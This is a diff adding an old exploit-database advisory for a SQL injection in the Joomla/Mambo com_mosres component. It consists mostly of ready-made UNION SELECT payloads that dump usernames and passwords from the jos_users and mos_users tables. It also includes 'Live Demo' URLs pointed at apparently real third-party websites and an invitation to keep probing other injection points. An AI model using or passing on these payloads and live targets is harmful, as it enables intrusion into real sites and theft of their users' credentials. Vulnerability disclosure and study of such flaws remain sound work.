@@ -1,0 +1,66 @@
+                                                                     
+==================================================================================
+     Joomla Component com_mosres (property_uid) SQL injection Vulnerability
+==================================================================================
+
+
+
+###################################################
+[+] Author        :  Chip D3 Bi0s
+[+] Author Name   :  Russell...
+[+] Email         :  chipdebios[alt+64]gmail.com
+[+] Group         :  LatinHackTeam
+[+] Vulnerability :  SQL injection 
+[+] Google Dork   :  imagine ;)
+[+] Email         :  chipdebios[alt+64]gmail.com
+
+###################################################
+
+Conditions        : magic_quotes_gpc = Off
+---------------------------------------------------
+Example Joomla:
+http://localHost/path/index.php?option=com_mosres&task=viewproperty&property_uid=[SQL code]
+
+[SQL code]:
+null'+and+1=2+union+select+1,2,3,4,concat(username,0x3a,password)ChipD3Bi0s,6,7,8,9,10,11,12,13+from+jos_users/*
+
+Live Demo:
+http://ahtopolbg.com/index.php?option=com_mosres&catID=1004&regID=2&task=viewproperty&property_uid=null'+and+1=2+union+select+1,2,3,4,concat(username,0x3a,password)ChipD3Bi0s,6,7,8,9,10,11,12,13+from+jos_users/*
+
+---------------------------------------------------
+Example Mambo:
+http://localHost/path/index.php?option=com_mosres&task=viewproperty&property_uid=[SQL code]
+
+[SQL code]:
+null'+and+1=2+union+select+1,2,3,4,concat(username,0x3a,password)ChipD3bi0s,6,7,8,9,10,11,12,13+from+mos_users/*
+
+Live Demo:
+http://www.velingradbg.com/index.php?option=com_mosres&task=viewproperty&property_uid=1005%27%20and%201=2%20union%20select%201,2,3,4,concat(username,0x3a,password)ChipD3bi0s,6,7,8,9,10,11,12,13+from+mos_users/*
+
+**************************
+however, still looking ... component, can be injected in several places (not all or always).
+Almost always SQL injection & also blind sql injection.
+I let you work ;)
+
+http://www.ahtopolbg.com/index.php?option=com_mosres&task=showregion&regID=4%27+and+1=2+union%20select%201,concat(username,0x3a,password)+from+jos_users/*&lang=bg
+
+**************************
+
+
++++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+<name>Mos Res</name>
+<creationDate>23/02/2005</creationDate>
+<author>Vince Wooll</author>
+<copyright> This component is released under the GNU/GPL License </copyright>
+<authorEmail>mosres@woollyinwales.co.uk</authorEmail>
+<authorUrl>http://www.mosres.net</authorUrl>
+<version>1.0f</version>
+<description>Mambo Resident component for v4.5.2</description>
+
+# milw0rm.com [2009-06-03]
